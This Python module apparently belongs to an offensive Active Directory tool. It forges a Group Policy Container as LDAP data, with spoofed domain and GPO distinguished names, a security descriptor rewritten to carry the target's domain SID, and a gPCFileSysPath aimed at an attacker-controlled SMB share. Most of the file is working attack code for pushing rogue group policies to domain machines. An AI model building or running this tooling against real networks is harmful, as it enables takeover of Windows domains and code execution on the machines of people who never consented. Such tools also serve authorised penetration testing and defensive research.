import json
import struct
import base64
from helpers.utils import bcolors, logger
from gpblib.modules_configs import MODULES_CONFIG

def generate_modified_sd(new_domain_sid: str) -> str:
    original_b64 = "AQAEnAABAAAcAQAAAAAAABQAAAAEAOwACAAAAAUCKAAAAQAAAQAAAI/9rO2z/9ERtB0AoMlo+TkBAQAAAAAABQsAAAAAACQA/wAPAAEFAAAAAAAFFQAAAOlmMDdEdl6WL4rswAACAAAAAiQA/wAPAAEFAAAAAAAFFQAAAOlmMDdEdl6WL4rswAACAAAAAiQA/wAPAAEFAAAAAAAFFQAAAOlmMDdEdl6WL4rswAcCAAAAAhQAlAACAAEBAAAAAAAFCQAAAAACFACUAAIAAQEAAAAAAAULAAAAAAIUAP8ADwABAQAAAAAABRIAAAAAChQA/wAPAAEBAAAAAAADAAAAAAEFAAAAAAAFFQAAAOlmMDdEdl6WL4rswAACAAABBQAAAAAABRUAAADpZjA3RHZeli+K7MAAAgAA"
    data = bytearray(base64.b64decode(original_b64))

    def get_domain_bytes(domain_str):
        parts = domain_str.split('-')
        if len(parts) >= 6 and parts[0] == 'S' and parts[1] == '1' and parts[2] == '5' and parts[3] == '21':
            x, y, z = int(parts[4]), int(parts[5]), int(parts[6])
            return struct.pack('<LLLL', 21, x, y, z)
        return None

    old_domain = get_domain_bytes("S-1-5-21-925918953-2522773060-3236727343")
    new_domain = get_domain_bytes(new_domain_sid)

    if old_domain and new_domain and data.count(old_domain) > 0:
        new_data = data.replace(old_domain, new_domain)
        return base64.b64encode(new_data).decode('utf-8')
    return original_b64



def generate_extension_names(module_name, extension_names):
    module = MODULES_CONFIG[module_name]

    if module["setting_type"] == "Preferences":
        if "00000000-0000-0000-0000-000000000000" not in [guid_pair[0] for guid_pair in extension_names]:
            extension_names.insert(0, ["00000000-0000-0000-0000-000000000000", module["admin_guid"]])
        else:
            for item in extension_names:
                if item[0] == "00000000-0000-0000-0000-000000000000":
                    if module["admin_guid"] not in item:
                        item.append(module["admin_guid"])
                    break

    if [module["cse_guid"], module["admin_guid"]] not in extension_names:
        extension_names.append([module["cse_guid"], module["admin_guid"]])
    
    # For whatever reason, extension names actually need to be sorted to be processed correctly (not the case for the GPO core Preferences guids)
    extension_names.sort(key=lambda guid_pair: guid_pair[0])
    return extension_names


def create_extension_names(modules):
    setting_types = ["user", "computer"]
    output = {}

    for setting_type in setting_types:
        extension_attribute = "gPCUserExtensionNames" if setting_type == "user" else "gPCMachineExtensionNames"
        extension_names = []
        for module_name in modules[setting_type].keys():
            extension_names = generate_extension_names(module_name, extension_names)
        if extension_names is not None:
            extension_names = [''.join(f"{{{guid}}}" for guid in guid_pair) for guid_pair in extension_names]
            extension_names = ''.join(f"[{item}]" for item in extension_names)
            logger.info(f"[INFO] Updated extension names: {extension_names}")
        output[extension_attribute] = extension_names
    return output


def create_gpc(cfg, modules, clean_folder):

    extension_names = create_extension_names(modules)
    # Calculate the version number
    versionNumber = 10
    if len(modules["computer"].keys()) > 0:
        versionNumber += 1
    if len(modules["user"].keys()) > 0:
        versionNumber += 65536

    # Create the JSON file containing the LDAP data
    ldap_data = {
        cfg.spoofed_ldap_dn: {
            f"cn=policies,cn=system,{cfg.spoofed_ldap_dn}": {
                cfg.spoofed_gpo_dn: {
                    "distinguishedName": cfg.spoofed_gpo_dn,
                    "nTSecurityDescriptor": f"base64:{generate_modified_sd(cfg.domain_sid)}",
                    "gPCFileSysPath": f"\\\\{cfg.smb_ip}\\{cfg.smb_share}",
                    "cn": f"{{{cfg.gpo_guid}}}",
                    "displayName": "SCAPY LDAP",
                    "versionNumber": versionNumber,
                    "gPCFunctionalityVersion": "2",
                    "flags": "0",
                    "gPCMachineExtensionNames": extension_names["gPCMachineExtensionNames"],
                    "gPCUserExtensionNames": extension_names["gPCUserExtensionNames"],
                    "objectClass": [
                        "top",
                        "container",
                        "groupPolicyContainer"
                    ],
                    "gPCWQLFilter": ""
                }
            }
        }
    }

    with open(f"{clean_folder}/ldap.json", "w") as f:
        json.dump(ldap_data, f, indent=4)

    logger.info(f"[INFO] LDAP data: {json.dumps(ldap_data, indent=4)}")
    logger.warning(f"{bcolors.OKGREEN}[+] Group Policy Container created at '{clean_folder}/ldap.json'{bcolors.ENDC}")